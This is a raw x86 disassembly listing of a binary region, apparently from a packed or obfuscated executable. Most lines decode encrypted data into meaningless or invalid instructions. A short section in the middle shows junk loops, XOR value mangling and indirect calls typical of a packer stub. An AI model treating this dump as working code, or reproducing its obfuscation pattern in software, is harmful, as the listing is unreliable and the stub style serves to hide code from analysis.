  40a7b6:	push   es
  40a7b7:	repz imul esi,DWORD PTR [eax-0x1b7d65ba],0xd2447c5c
  40a7c2:	sbb    al,0x2f
  40a7c4:	sahf   
  40a7c5:	(bad)  
  40a7c6:	test   al,0xb4
  40a7c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c9:	les    ebp,FWORD PTR [esi-0x71]
  40a7cc:	mov    esi,0x29ab428d
  40a7d1:	sub    eax,0x714597d5
  40a7d6:	adc    edx,0x3
  40a7d9:	aaa    
  40a7da:	dec    ebx
  40a7db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7dc:	xor    dl,dl
  40a7de:	xchg   ebp,eax
  40a7df:	add    al,0xc9
  40a7e1:	out    0x8d,al
  40a7e3:	push   esi
  40a7e4:	pop    es
  40a7e5:	mov    edi,DWORD PTR [edx+0x3f172fc4]
  40a7eb:	std    
  40a7ec:	pushf  
  40a7ed:	scas   eax,DWORD PTR es:[edi]
  40a7ee:	out    dx,al
  40a7ef:	dec    ecx
  40a7f0:	popa   
  40a7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7f2:	aas    
  40a7f3:	call   0xdf756e5b
  40a7f8:	bound  edi,QWORD PTR [ebp+0x46226899]
  40a7fe:	cmp    BYTE PTR ds:0x2b0ec169,ah
  40a804:	cmp    cl,BYTE PTR [edx]
  40a806:	and    esi,DWORD PTR [ebp-0x1f]
  40a809:	fwait
  40a80a:	jp     0x40a7ff
  40a80c:	xor    al,0x9c
  40a80e:	lods   al,BYTE PTR ds:[esi]
  40a80f:	idiv   DWORD PTR [ebp-0x21]
  40a812:	cmp    ebx,DWORD PTR [ecx]
  40a814:	pop    esp
  40a815:	icebp  
  40a816:	adc    edi,edx
  40a818:	addr16 jle 0x40a7d4
  40a81b:	cdq    
  40a81c:	xor    DWORD PTR [esi],edi
  40a81e:	xor    esp,ebx
  40a820:	mov    WORD PTR [eax+0x3d1470e0],es
  40a826:	jne    0x40a82e
  40a828:	sti    
  40a829:	sub    DWORD PTR [ecx-0x5803df3f],0x5a
  40a830:	fimul  DWORD PTR [ebx+0x2d26c53]
  40a836:	(bad)  
  40a837:	test   al,0x3
  40a839:	fadd   DWORD PTR [edx-0x4a]
  40a83c:	xchg   esi,eax
  40a83d:	inc    ebp
  40a83e:	stc    
  40a83f:	push   ebp
  40a840:	cmp    cl,BYTE PTR [ebp+0x50]
  40a843:	ret    
  40a844:	jb     0x40a8a2
  40a846:	bound  edi,QWORD PTR [esi+0x7b06278d]
  40a84c:	adc    eax,0x8c02e760
  40a851:	xor    ah,BYTE PTR [ebx-0x17fa0b86]
  40a857:	sub    eax,0xbbec66d1
  40a85c:	outs   dx,DWORD PTR ds:[esi]
  40a85d:	les    ebx,FWORD PTR [eax]
  40a85f:	push   esi
  40a860:	jl     0x40a89f
  40a862:	in     eax,0xfd
  40a864:	add    ebx,DWORD PTR [ebp+eiz*4-0x1f]
  40a868:	sub    bl,BYTE PTR [ecx-0x5c]
  40a86b:	sub    BYTE PTR [edx+0x5e],bh
  40a86e:	ret    
  40a86f:	and    eax,0x77788c45
  40a874:	adc    DWORD PTR [edx+0x3d],0x6bec243
  40a87b:	mov    edi,DWORD PTR [ebx-0x4f12aee6]
  40a881:	(bad)  
  40a883:	pop    edx
  40a884:	jmp    0x40a87d
  40a886:	ins    DWORD PTR es:[edi],dx
  40a887:	ret    
  40a888:	push   ds
  40a889:	jmp    0xddf6:0xefe627de
  40a890:	out    dx,al
  40a891:	imul   edx,DWORD PTR [ebp-0x5f],0xffffffc3
  40a895:	ins    DWORD PTR es:[edi],dx
  40a896:	or     eax,0x8f7c6cc9
  40a89b:	xor    edx,DWORD PTR [edx]
  40a89d:	fld    QWORD PTR [eax]
  40a89f:	xchg   ecx,eax
  40a8a0:	push   ecx
  40a8a1:	shl    DWORD PTR [ebx+0x6d2af587],1
  40a8a7:	test   DWORD PTR [ebx+edi*8],edx
  40a8aa:	mov    DWORD PTR [edx-0x11449528],esp
  40a8b0:	mov    ch,dl
  40a8b2:	xor    DWORD PTR [esp+eax*4-0x63481e5c],0xf46774b6
  40a8bd:	leave  
  40a8be:	stc    
  40a8bf:	pop    ecx
  40a8c0:	mov    dl,0xe5
  40a8c2:	shl    BYTE PTR [eax+0x2a],0xae
  40a8c6:	or     bl,BYTE PTR [esi+0x74]
  40a8c9:	daa    
  40a8ca:	bound  ebp,QWORD PTR [ebp+0x45]
  40a8cd:	into   
  40a8ce:	loopne 0x40a8d8
  40a8d0:	std    
  40a8d1:	mov    eax,0xb3862fc3
  40a8d6:	loopne 0x40a950
  40a8d8:	call   FWORD PTR [ebp+0x20a166ea]
  40a8de:	loop   0x40a94b
  40a8e0:	icebp  
  40a8e1:	nop
  40a8e2:	pushf  
  40a8e3:	popf   
  40a8e4:	mov    bl,0x2e
  40a8e6:	push   esp
  40a8e7:	and    DWORD PTR [edi],esp
  40a8e9:	outs   dx,DWORD PTR ds:[esi]
  40a8ea:	adc    al,BYTE PTR [ebx+0x3d9ce3cc]
  40a8f0:	xlat   BYTE PTR ds:[ebx]
  40a8f1:	rcl    DWORD PTR [ebp+0x3e],1
  40a8f4:	jp     0x40a946
  40a8f6:	addr16 dec ecx
  40a8f8:	push   0x95cc9a44
  40a8fd:	aad    0xfa
  40a8ff:	and    eax,0x4d4ae45c
  40a904:	dec    eax
  40a905:	add    DWORD PTR [eax-0x44909f7],0x5d
  40a90c:	xchg   dh,ch
  40a90e:	int    0xf1
  40a910:	idiv   BYTE PTR [edi-0x60cc6071]
  40a916:	stc    
  40a917:	or     BYTE PTR ds:0x6310e69f,bh
  40a91d:	inc    DWORD PTR [edx+edi*4-0x658905bb]
  40a924:	cmp    cl,cl
  40a926:	scas   eax,DWORD PTR es:[edi]
  40a927:	or     dl,BYTE PTR [ecx]
  40a929:	pop    esp
  40a92a:	je     0x40a967
  40a92c:	jne    0x40a917
  40a92e:	adc    edi,DWORD PTR [edi-0x462a587c]
  40a934:	add    esp,DWORD PTR [eax-0x73cda4e8]
  40a93a:	lock inc ebx
  40a93c:	sbb    BYTE PTR [ecx],ch
  40a93e:	adc    dl,0x6
  40a941:	xchg   DWORD PTR [ebp+0x29da77ad],ecx
  40a947:	fistp  QWORD PTR [edi]
  40a949:	push   ebx
  40a94a:	cli    
  40a94b:	jl     0x40a911
  40a94d:	pop    ss
  40a94e:	sbb    esi,DWORD PTR [ecx+edx*1-0x1]
  40a952:	into   
  40a953:	dec    BYTE PTR [ecx]
  40a955:	jno    0x40a91c
  40a957:	mov    esi,0x61e447e7
  40a95c:	dec    esp
  40a95d:	mov    dl,0x3f
  40a95f:	outs   dx,DWORD PTR ds:[esi]
  40a960:	cmp    DWORD PTR [ecx+eax*4-0x2974d3e0],eax
  40a967:	dec    ebx
  40a968:	xor    ah,0x5c
  40a96b:	xlat   BYTE PTR ds:[ebx]
  40a96c:	inc    ecx
  40a96d:	cdq    
  40a96e:	jns    0x40a9ca
  40a970:	dec    ebp
  40a971:	lea    ebp,[edx+0x28]
  40a974:	add    al,0x29
  40a976:	test   BYTE PTR [ebx+0x7d356d91],dl
  40a97c:	mov    WORD PTR [esi+ebx*8],?
  40a97f:	or     ecx,DWORD PTR [edx+0x15d74ac7]
  40a985:	pop    eax
  40a986:	inc    esp
  40a987:	rcr    DWORD PTR [ebx+0x57],0x4c
  40a98b:	stc    
  40a98c:	popa   
  40a98d:	rcr    DWORD PTR [edx-0x6],cl
  40a990:	in     al,dx
  40a991:	push   esi
  40a992:	or     DWORD PTR ds:0x428e7f,0x7ae1
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42a9ef
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42a9bb
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429beb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42a9bf
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	or     al,0x3d
  40aafd:	ret    
  40aafe:	xchg   ecx,eax
  40aaff:	out    0xf6,eax
  40ab01:	add    DWORD PTR [ebx-0x7c7c9f0f],0x1a
  40ab08:	push   0xffffffa2
  40ab0a:	xchg   ebx,eax
  40ab0b:	imul   ebx,ecx,0xffffffb4
  40ab0e:	push   esp
  40ab0f:	or     BYTE PTR [esi-0x4a],dh
  40ab12:	ins    BYTE PTR es:[edi],dx
  40ab13:	mov    eax,0x23dc2d61
  40ab18:	sbb    eax,0x7e843a86
  40ab1d:	sti    
  40ab1e:	je     0x40ab7e
  40ab20:	dec    ecx
  40ab21:	cmp    esp,DWORD PTR [ebp-0x2]
  40ab24:	xor    bl,BYTE PTR [ecx-0x384aab13]
  40ab2a:	mov    DWORD PTR [ecx-0x515eb009],0xf1ee42e2
  40ab34:	xchg   edx,eax
  40ab35:	ret    0x5025
  40ab38:	jo     0x40ab86
  40ab3a:	popf   
  40ab3b:	sbb    al,0xd5
  40ab3d:	or     eax,DWORD PTR [eax-0x3e]
  40ab40:	inc    ebp
  40ab41:	jmp    0x6520:0x397ec797
  40ab48:	fcomip st,st(6)
  40ab4a:	dec    ebx
  40ab4b:	mov    edi,0x9be6f055
  40ab50:	and    ebx,edx
  40ab52:	dec    BYTE PTR [edi-0x20]
  40ab55:	ret    
  40ab56:	mov    eax,0x6d14c5ac
  40ab5b:	add    eax,0x34b672c1
  40ab60:	rcl    dl,1
  40ab62:	cmp    bl,BYTE PTR [edx]
  40ab64:	jle    0x40ab01
  40ab66:	nop
  40ab67:	pop    ss
  40ab68:	pop    eax
  40ab69:	sub    al,BYTE PTR [ecx-0x19]
  40ab6c:	jmp    DWORD PTR [eax]
  40ab6e:	jmp    0x40ab21
  40ab70:	mov    edi,0x991996c0
  40ab75:	repnz add al,0x2
  40ab78:	inc    esi
  40ab79:	xchg   ebp,eax
  40ab7a:	jle    0x40ab82
  40ab7c:	push   esi
  40ab7d:	loope  0x40ab84
  40ab7f:	push   ebp
  40ab80:	xor    eax,0xbba49be
  40ab85:	mov    ds:0xc93ae7e2,eax
  40ab8a:	jb     0x40ab80
  40ab8c:	inc    ebp
  40ab8d:	cmp    eax,esp
  40ab8f:	adc    al,0xdb
  40ab91:	aad    0x69
  40ab93:	jl     0x40abc7
  40ab95:	mov    dh,0xc8
  40ab97:	cs jle 0x40ab2f
  40ab9a:	popf   
  40ab9b:	lea    ecx,[edx+0x78]
  40ab9e:	enter  0xa4c1,0x51
  40aba2:	sub    eax,0x5a154c7c
  40aba7:	mov    bh,0x54
  40aba9:	lods   eax,DWORD PTR ds:[esi]
  40abaa:	stos   DWORD PTR es:[edi],eax
  40abab:	(bad)  
  40abad:	adc    al,0xf3
  40abaf:	or     al,BYTE PTR [ebx]
  40abb1:	div    dh
  40abb3:	nop
  40abb4:	jle    0x40ac23
  40abb6:	aas    
  40abb7:	dec    esi
  40abb8:	fidiv  WORD PTR [ecx-0x56]
  40abbb:	cmc    
  40abbc:	xor    ch,BYTE PTR [ebp+0x22e9da59]
  40abc2:	adc    al,0xeb
  40abc4:	sbb    eax,0x9bf9878f
  40abc9:	push   0x57a80fb1
  40abce:	mov    bh,0xd
  40abd0:	push   ecx
  40abd1:	fstp   TBYTE PTR [ecx]
  40abd3:	push   0xde38ad58
  40abd8:	cmc    
  40abd9:	dec    esp
  40abda:	dec    esp
  40abdb:	xor    dl,bh
  40abdd:	add    DWORD PTR [ebx+0x1d1b38e1],esp
  40abe3:	into   
  40abe4:	xor    ah,BYTE PTR [esi-0x62668d41]
  40abea:	outs   dx,BYTE PTR ds:[esi]
  40abeb:	pop    ss
  40abec:	mov    bh,0x2b
  40abee:	retf   
  40abef:	int3   
  40abf0:	jg     0x40ac06
  40abf2:	aam    0x3a
  40abf4:	ja     0x40ac4f
  40abf6:	loope  0x40ac37
  40abf8:	inc    esp
  40abf9:	jmp    0x40abf3
  40abfb:	cmp    eax,0x7641b184
  40ac00:	jl     0x40ac10
  40ac02:	mov    al,0x62
  40ac04:	mov    eax,0x817699f0
  40ac09:	xor    ebp,DWORD PTR [ebx-0x389c8066]
  40ac0f:	aaa    
  40ac10:	mov    esp,0xe3c1680c
  40ac15:	mov    edi,0xb90cfdf7
  40ac1a:	dec    ecx
  40ac1b:	mov    ebx,0x8b8a3039
  40ac21:	in     eax,dx
  40ac22:	enter  0x9f81,0x8f
  40ac26:	and    DWORD PTR [ecx-0x4bcf5c9e],eax
  40ac2c:	mov    BYTE PTR [edi+0x21],dl
  40ac2f:	jecxz  0x40ac08
  40ac31:	xor    edx,eax
  40ac33:	bnd jmp 0x40ac5c
  40ac36:	sar    DWORD PTR [ebp+0x78],0xf1
  40ac3a:	mov    cs,WORD PTR [ecx]
  40ac3c:	push   esp
  40ac3d:	jg     0x40abff
  40ac3f:	sub    ecx,DWORD PTR [esi+ebp*4-0x4e]
  40ac43:	adc    eax,DWORD PTR [eax+0x7]
  40ac46:	sub    edx,DWORD PTR [ebx-0x23755ca7]
  40ac4c:	mov    edx,0xea8c18fe
  40ac51:	loop   0x40abea
  40ac53:	fadd   st,st(5)
  40ac55:	push   ss
  40ac56:	scas   al,BYTE PTR es:[edi]
  40ac57:	ss lock push esi
  40ac5a:	stos   BYTE PTR es:[edi],al
  40ac5b:	mov    cl,0x79
  40ac5d:	jae    0x40acb3
  40ac5f:	ss mov eax,0x5a8a5e3c
  40ac65:	mov    esp,0xd29767cc
  40ac6a:	ret    
  40ac6b:	scas   eax,DWORD PTR es:[edi]
  40ac6c:	and    edx,ebx
  40ac6e:	add    esi,DWORD PTR [ebp+0x369f79ee]
  40ac74:	cmp    edx,DWORD PTR [ebx+ebp*4]
  40ac77:	es loope 0x40acd9
  40ac7a:	mov    ah,0xc3
  40ac7c:	jae    0x40ac4b
  40ac7e:	aas    
  40ac7f:	in     al,dx
  40ac80:	ds stos BYTE PTR es:[edi],al
  40ac82:	pop    esp
  40ac83:	xor    al,0xc
  40ac85:	sub    eax,0x16f11541
  40ac8a:	(bad)  
  40ac8b:	cmp    esi,ebp
  40ac8d:	data16 cmp dl,BYTE PTR ss:[ecx-0x1f818975]
  40ac95:	leave  
  40ac96:	mov    ecx,DWORD PTR [ebp-0x7e59509c]
  40ac9c:	push   0xffffffc4
  40ac9e:	inc    ebx
  40ac9f:	add    al,0x26
  40aca1:	jns    0x40ac32
  40aca3:	lods   al,BYTE PTR ds:[esi]
  40aca4:	adc    eax,0xb0c0cdea
  40aca9:	mov    edi,esp
  40acab:	or     al,0xea
  40acad:	ds mov ecx,0xd3253ac1
  40acb3:	push   es
  40acb4:	pop    eax
  40acb5:	lods   al,BYTE PTR ds:[esi]
  40acb6:	in     al,0xb9
  40acb8:	inc    edi
  40acb9:	les    ecx,FWORD PTR [ebx+0x5d]
  40acbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acbd:	call   0x929c:0xb6df2308
  40acc4:	sub    eax,0x6be268d6
  40acc9:	sub    esp,ebx
  40accb:	out    0x2a,al
  40accd:	mov    edi,0x7907a14c
  40acd2:	int3   
  40acd3:	call   0x3de7:0xa5211578
  40acda:	fist   WORD PTR [esi+0x5501d06]
  40ace0:	call   0x69245b9d
  40ace5:	lea    dx,[ecx]
  40ace8:	xchg   esi,eax
  40ace9:	fmul   st(0),st
  40aceb:	ret    
  40acec:	pop    esi
  40aced:	sub    eax,0x6e36bcb1
  40acf2:	call   0xecbe:0x9048d32d
  40acf9:	jmp    0x2688:0x32e89ede
  40ad00:	seto   BYTE PTR [esi-0x715deae8]
  40ad07:	jg     0x40acc5
  40ad09:	or     DWORD PTR [ecx+eiz*8+0xcbeeb0d],esp
  40ad10:	and    DWORD PTR [edi+0x42],ebp
  40ad13:	xadd   DWORD PTR [eax+ebp*8-0x72],eax
  40ad18:	inc    esp
  40ad19:	hlt    
  40ad1a:	out    0xc7,eax
  40ad1c:	les    esi,FWORD PTR [ebx-0x1]
  40ad1f:	cdq    
  40ad20:	inc    edx
  40ad21:	aad    0xa1
  40ad23:	in     al,0x6e
  40ad25:	int    0x85
  40ad27:	inc    esp
  40ad28:	pop    eax
  40ad29:	xchg   ecx,eax
  40ad2a:	aad    0xcd
  40ad2c:	call   0x2f8c:0x9a58db1c
  40ad33:	fcom   st(4)
  40ad35:	int3   
  40ad36:	in     eax,0x9e
  40ad38:	or     al,0xdc
  40ad3a:	push   eax
  40ad3b:	add    dl,bh
  40ad3d:	bound  ebx,QWORD PTR [ebx+0xd]
  40ad40:	nop
  40ad41:	mov    ss,WORD PTR [esp+edx*1]
  40ad44:	outs   dx,BYTE PTR ds:[esi]
  40ad45:	ja     0x40acf5
  40ad47:	ins    BYTE PTR es:[edi],dx
  40ad48:	arpl   WORD PTR [esi+0x44],bp
  40ad4b:	mov    ebx,0x979800cb
  40ad50:	inc    ebx
  40ad51:	retf   0x1452
  40ad54:	ss test al,0x4b
  40ad57:	mov    al,ds:0x5b9d25b2
  40ad5c:	pop    ebx
  40ad5d:	jns    0x40acfd
  40ad5f:	les    edx,FWORD PTR [edi+0x60]
  40ad62:	adc    ebp,DWORD PTR [esi]
  40ad64:	dec    esi
  40ad65:	push   esi
  40ad66:	sub    cl,ch
  40ad68:	mov    BYTE PTR [edx-0x4],bh
  40ad6b:	cmp    al,0xac
  40ad6d:	mov    dl,0x29
  40ad6f:	pop    eax
  40ad70:	ror    DWORD PTR [eax],cl
  40ad72:	test   BYTE PTR [ebp-0x2],bh
  40ad75:	cmp    bh,BYTE PTR ds:0x75d308d7
  40ad7b:	xchg   ebx,eax
  40ad7c:	or     ch,BYTE PTR [edi]
  40ad7e:	xor    dl,BYTE PTR [ebx+0x42]
  40ad81:	dec    edi
  40ad82:	mov    ebx,0x5ed3f976
  40ad87:	inc    esp
  40ad88:	or     BYTE PTR [edx+ebp*1-0x55],bh
  40ad8c:	(bad)  
  40ad8d:	mov    ecx,0xdbe5e130
  40ad92:	mov    edi,0xf2245307
  40ad97:	mov    ebp,DWORD PTR [edi+0x3ea64c9a]
  40ad9d:	retf   
  40ad9e:	loop   0x40adc8
  40ada0:	jl     0x40ad60
  40ada2:	inc    edx
  40ada3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ada4:	dec    ebp
  40ada5:	mov    ebx,0xb64bb8c2
  40adaa:	fs pop edx
  40adac:	xchg   edx,eax
  40adad:	rcl    BYTE PTR [esi-0x496e372e],1
  40adb3:	das    
  40adb4:	in     eax,0xcc
  40adb6:	sbb    dh,BYTE PTR [ebx+0x30b83024]
  40adbc:	add    DWORD PTR [esi+0x62],esi
  40adbf:	add    ch,BYTE PTR [ecx+0x7da912e0]
  40adc5:	mov    esi,0x4906c87c
  40adca:	call   0xf381771f
  40adcf:	cmp    DWORD PTR [esi+0x1cacf86c],ebp
  40add5:	mov    esp,0xd55939f8
  40adda:	in     eax,dx
  40addb:	jecxz  0x40ad5e
  40addd:	fnstsw WORD PTR [eax-0x2c4e99b6]
  40ade3:	jl     0x40add8
  40ade5:	add    dl,BYTE PTR [ebp-0x3244010b]
  40adeb:	lock test dh,dl
  40adee:	mov    ds:0x1271febc,eax
  40adf3:	repnz fwait
  40adf5:	ror    BYTE PTR [ecx+ebp*4-0xdb4f82d],cl
  40adfc:	add    eax,0x64b9bc27
  40ae01:	jno    0x40ada8
  40ae03:	in     al,dx
  40ae04:	sub    eax,0x1284d662
  40ae09:	add    DWORD PTR [esi],ebp
  40ae0b:	adc    BYTE PTR [ecx-0x679693f9],ch
  40ae11:	jmp    0xa8cf:0x83bced5a
  40ae18:	outs   dx,BYTE PTR ds:[esi]
  40ae19:	mov    ch,0xe0
  40ae1b:	sbb    al,0xc0
  40ae1d:	pop    edx
  40ae1e:	inc    edi
  40ae1f:	fs repnz push ecx
  40ae22:	cld    
  40ae23:	dec    esp
  40ae24:	lds    esp,FWORD PTR [esi]
  40ae26:	mov    ds:0xa5c5f7f1,al
  40ae2b:	push   esp
  40ae2c:	out    0x9d,al
  40ae2e:	in     eax,0x56
  40ae30:	call   0x168d:0x1d62a462
  40ae37:	int3   
  40ae38:	jae    0x40ae40
  40ae3a:	jbe    0x40ae50
  40ae3c:	in     eax,dx
  40ae3d:	nop
  40ae3e:	adc    al,0x74
  40ae40:	ss pop edi
  40ae42:	(bad)  
  40ae43:	loopne 0x40ae4b
  40ae45:	icebp  
  40ae46:	mov    edi,0x7040cd79
  40ae4b:	or     eax,0xcd65805a
  40ae50:	in     eax,dx
  40ae51:	int    0x5e
  40ae53:	add    BYTE PTR [edx+0x5e4503e2],dh
  40ae59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae5a:	push   ebp
  40ae5b:	fdiv   DWORD PTR [esi-0x78]
  40ae5e:	pop    edi
  40ae5f:	xchg   DWORD PTR [eax+0x1e],eax
  40ae62:	in     eax,dx
  40ae63:	adc    eax,0xb42a60d0
  40ae68:	xchg   DWORD PTR [ebx],ecx
  40ae6a:	push   ecx
  40ae6b:	hlt    
  40ae6c:	jg     0x40aec6
  40ae6e:	adc    al,0xf5
  40ae70:	mov    ch,0x23
  40ae72:	sar    DWORD PTR [ecx],cl
  40ae74:	push   ecx
  40ae75:	or     bh,dh
  40ae77:	pop    ebx
  40ae78:	ss xchg edi,eax
  40ae7a:	jns    0x40aee5
  40ae7c:	call   0x64a76052
  40ae81:	test   al,0xc7
  40ae83:	mov    edx,0xe7f62728
  40ae88:	mov    al,0x80
  40ae8a:	inc    ecx
  40ae8b:	bswap  ecx
  40ae8d:	out    0x33,eax
  40ae8f:	xor    esi,esi
  40ae91:	xchg   edi,eax
  40ae92:	sti    
  40ae93:	sbb    dl,dl
  40ae95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae96:	ja     0x40ae5e
  40ae98:	ss mov ebp,0x203902e2
  40ae9e:	and    eax,DWORD PTR [esi+0x32]
  40aea1:	xchg   DWORD PTR [edx-0x329cd440],esp
  40aea7:	jb     0x40ae7d
  40aea9:	mov    al,ss:0x3ce4a53
  40aeaf:	jno    0x40aea1
  40aeb1:	inc    esp
  40aeb2:	jmp    0x40ae7a
  40aeb4:	ins    DWORD PTR es:[edi],dx
  40aeb5:	data16 jno 0x40ae92
  40aeb8:	imul   esi
  40aeba:	cmp    al,0x29
  40aebc:	fs scas al,BYTE PTR es:[edi]
  40aebe:	leave  
  40aebf:	in     eax,0x1c
  40aec1:	jmp    0x40af35
  40aec3:	jl     0x40aef7
  40aec5:	cmp    DWORD PTR [ecx],0x91cebb5d
  40aecb:	push   ebp
  40aecc:	sub    eax,0xc6fb46fa
  40aed1:	(bad)  
  40aed2:	loope  0x40ae5c
  40aed4:	adc    eax,0xf83afb1
  40aed9:	aad    0x19
  40aedb:	pop    esi
  40aedc:	inc    esp
  40aedd:	and    cl,BYTE PTR [eax+0x73c1e2a6]
  40aee3:	(bad)  
  40aee4:	sub    BYTE PTR [esi-0x7ab87de9],bl
  40aeea:	lahf   
  40aeeb:	ins    BYTE PTR es:[edi],dx
  40aeec:	(bad)  
  40aeed:	retf   
  40aeee:	add    al,0x79
  40aef0:	inc    eax
  40aef1:	stos   BYTE PTR es:[edi],al
  40aef2:	pop    ds
  40aef3:	test   eax,0xd6653886
  40aef8:	popa   
  40aef9:	clc    
  40aefa:	std    
  40aefb:	arpl   WORD PTR [esi+ecx*8],di
  40aefe:	(bad)  
  40aeff:	(bad)  [ebx+ebp*1]
  40af02:	dec    edi
  40af03:	int    0x18
  40af05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af06:	stos   DWORD PTR es:[edi],eax
  40af07:	test   DWORD PTR [edi+0x79],esp
  40af0a:	jb     0x40af58
  40af0c:	inc    ecx
  40af0d:	or     bl,BYTE PTR [ebx+0x1cbb635]
  40af13:	shr    DWORD PTR [esi+ecx*4+0x6391c8e],cl
  40af1a:	ret    0x10e9
  40af1d:	mov    eax,0xf340cab8
  40af22:	inc    ecx
  40af23:	mov    al,ds:0x3eee899a
  40af28:	fnstsw WORD PTR [esi]
  40af2a:	(bad)  
  40af2b:	ja     0x40aed6
  40af2d:	push   edi
  40af2e:	fabs   
  40af30:	fcmovu st,st(3)
  40af32:	arpl   WORD PTR [esi-0x38],cx
  40af35:	push   edx
  40af36:	xor    ebx,esi
  40af38:	cmp    BYTE PTR ds:0x9be9c01b,cl
  40af3e:	jmp    0x40afa2
  40af40:	out    dx,al
  40af41:	and    eax,0xbcfd2b97
  40af46:	stc    
  40af47:	rcr    al,cl
  40af49:	arpl   WORD PTR [edi],cx
  40af4b:	sahf   
  40af4c:	push   0x2457db56
  40af51:	test   eax,0x23717100
  40af56:	ins    BYTE PTR es:[edi],dx
  40af57:	add    ah,BYTE PTR [edx-0x4c]
  40af5a:	(bad)  
  40af5b:	fcmovne st,st(1)
  40af5d:	sti    
  40af5e:	add    ah,al
  40af60:	stc    
  40af61:	and    ah,BYTE PTR [edi+ebp*2+0x1e]
  40af65:	jne    0x40afc0
  40af67:	dec    ebx
  40af68:	adc    al,bl
  40af6a:	mov    eax,0xe695e558
  40af6f:	mov    edi,0x92b3dccc
  40af74:	jae    0x40af34
  40af76:	imul   ebx,DWORD PTR [esp+ebp*8+0x1a9c57d1],0x9786ac7d
  40af81:	mov    al,0x5d
  40af83:	xchg   ecx,eax
  40af84:	xor    dh,ch
  40af86:	jo     0x40af6b
  40af88:	jecxz  0x40afe6
  40af8a:	or     eax,0xf1bcac0d
  40af8f:	or     esi,DWORD PTR [ebx-0xdde31c5]
  40af95:	rcr    BYTE PTR ds:0x8b72c63b,cl
  40af9b:	dec    edi
  40af9c:	fs inc esi
  40af9e:	loopne 0x40afc4
  40afa0:	pusha  
  40afa1:	fnstcw WORD PTR [ebx]
  40afa3:	test   DWORD PTR [edx],edi
  40afa5:	pop    ss
  40afa6:	jo     0x40af8f
  40afa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afa9:	cmp    eax,0x1b0e45e2
  40afae:	and    DWORD PTR [ebx],esp
  40afb0:	sbb    ebx,edi
  40afb2:	sub    edx,DWORD PTR [eax-0xe]
  40afb5:	icebp  
  40afb6:	jg     0x40b016
  40afb8:	push   ebx
  40afb9:	xor    eax,0xec33f7bc
  40afbe:	sub    dl,ah
  40afc0:	or     BYTE PTR [ecx+0x11],bh
  40afc3:	pop    es
  40afc4:	popf   
  40afc5:	inc    esp
  40afc6:	jle    0x40b038
  40afc8:	mov    bh,0xbc
  40afca:	sbb    eax,DWORD PTR [eax+0x29edb0a3]
  40afd0:	dec    ebp
  40afd1:	rcr    ebp,1
  40afd3:	jge    0x40afba
  40afd5:	std    
  40afd6:	arpl   cx,dx
